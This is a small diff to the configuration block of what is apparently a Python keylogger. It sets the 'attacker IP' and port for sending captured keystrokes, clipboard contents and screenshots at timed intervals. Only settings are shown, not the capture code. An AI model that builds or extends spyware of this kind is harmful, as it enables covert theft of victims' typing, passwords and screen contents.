@@ -32,7 +32,7 @@ clipboard_data = ""  # Global variable to store clipboard content
 previous_clipboard_data = ""  # To track the previous clipboard content
 
 # Configuration settings
-server_ip = "192.168.43.245"  # Change this based on your attacker IP
+server_ip = "127.0.0.1"  # Change this based on your attacker IP
 server_port = 8080  # Change this based on your specified port
 send_interval = 10  # Interval (in seconds) between sending keystrokes and clipboard data
 screenshot_interval = 10  # Interval (in seconds) between sending screenshots
